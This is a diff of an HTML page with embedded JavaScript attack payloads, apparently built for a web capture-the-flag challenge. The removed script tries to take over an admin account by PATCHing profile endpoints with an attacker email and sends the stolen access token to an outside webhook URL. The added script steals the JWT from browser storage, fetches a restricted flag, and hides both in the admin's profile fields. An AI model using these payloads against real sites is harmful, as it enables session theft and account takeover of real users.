@@ -1,40 +1,37 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-    const webhook = "https://webhook.site/84ee3ba2-aca6-4c8d-acf0-2a0c3ee65318";
-    
-    async function performATO() {
-        // Try to change the email to one you control
-        // If the email changes, you can then trigger a "Forgot Password"
-        const endpoints = [
-            '/api/auth/profile',
-            '/api/auth/account',
-            '/api/admin/users/update'
-        ];
+    <script>
+        async function captureAndLeak() {
+            // 1. Try to grab the JWT from LocalStorage or SessionStorage
+            const token = localStorage.getItem('accessToken') || 
+                          sessionStorage.getItem('accessToken') || 
+                          "Token not in Storage";
 
-        for (let url of endpoints) {
+            // 2. Try to fetch the Flag from the restricted endpoint
+            let flag = "Flag not found";
             try {
-                await fetch(url, {
-                    method: 'PATCH',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        "id": "69d28e841cda77b519a9550e", // Admin ID
-                        "email": "yourname@attacker.com", // CHANGE THIS TO YOUR EMAIL
-                        "fullName": "ATO_IN_PROGRESS"
-                    })
-                });
-            } catch (e) {}
+                const res = await fetch('/api/admin/flag');
+                if(res.ok) flag = await res.text();
+            } catch(e) {}
+
+            // 3. INTERNAL LEAK: Save both the Token and Flag into the Admin's Profile
+            // We use the 'phoneNumber' and 'address' fields as our "storage"
+            await fetch('/api/auth/profile', {
+                method: 'PATCH',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "fullName": "LEAK_SUCCESS",
+                    "phoneNumber": flag.substring(0, 50),
+                    "address": {
+                        "street": token.substring(0, 50), // First part of JWT
+                        "city": token.substring(50, 100), // Second part of JWT
+                        "state": "LB"
+                    }
+                })
+            });
         }
-        
-        // Signal the webhook that the attempt is finished
-        fetch(webhook + "?status=ATO_Attempted");
-    }
-    performATO();
-    const token = localStorage.getItem('accessToken') || sessionStorage.getItem('accessToken');
-if (token) {
-    fetch(webhook + "?token=" + btoa(token));
-}
-</script>
+        captureAndLeak();
+    </script>
 </body>
 </html>
